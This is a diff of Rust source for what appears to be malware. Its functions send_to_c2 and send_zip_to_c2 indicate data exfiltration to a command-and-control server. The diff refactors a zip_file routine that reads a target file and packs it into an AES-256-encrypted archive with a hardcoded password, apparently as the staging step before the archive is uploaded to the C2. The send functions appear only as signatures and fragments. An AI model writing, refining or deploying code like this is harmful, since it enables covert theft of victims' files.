@@ -1,10 +1,10 @@
-use reqwest::Error;
 use reqwest::Client;
+use reqwest::Error;
 use serde::Deserialize;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::Read;
-use std::path::PathBuf;
+use std::path::Path;
 use tempfile::NamedTempFile;
 use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
@@ -54,29 +54,27 @@ pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
     Ok(())
 }
 
-pub async fn zip_file(filename: &PathBuf) -> ZipResult<()> {
+pub async fn zip_file(filename: &Path) -> ZipResult<NamedTempFile> {
     let mut tmp_archive = NamedTempFile::new()?;
+    {
+        let mut zip = zip::ZipWriter::new(&mut tmp_archive);
 
-    let mut zip = zip::ZipWriter::new(tmp_archive.as_file_mut());
+        let mut file = File::open(filename)?;
+        let mut buff = Vec::new();
+        file.read_to_end(&mut buff)?;
 
-    // Ouvrir le fichier à compresser
-    let mut file = File::open(filename)?;
-    let mut buff = Vec::new();
-    file.read_to_end(&mut buff)?;
+        let options = SimpleFileOptions::default()
+            .compression_method(CompressionMethod::Deflated)
+            .with_aes_encryption(AesMode::Aes256, "password");
 
-    let options = SimpleFileOptions::default()
-        .compression_method(CompressionMethod::Zstd)
-        .with_aes_encryption(AesMode::Aes256, "password");
+        let archive_name = filename.file_name().unwrap_or_default().to_string_lossy();
 
-    zip.start_file(filename.to_string_lossy(), options)?;
-    zip.write_all(&buff)?;
+        zip.start_file(archive_name, options)?;
+        zip.write_all(&buff)?;
+        zip.finish()?;
+    }
 
-    zip.finish()?;
-
-    // DEBUG
-    // tmp_archive.persist("archive.zip");
-
-    Ok(())
+    Ok(tmp_archive)
 }
 
 pub async fn send_zip_to_c2(filepath: &str) -> Result<(), Box<dyn std::error::Error>> {
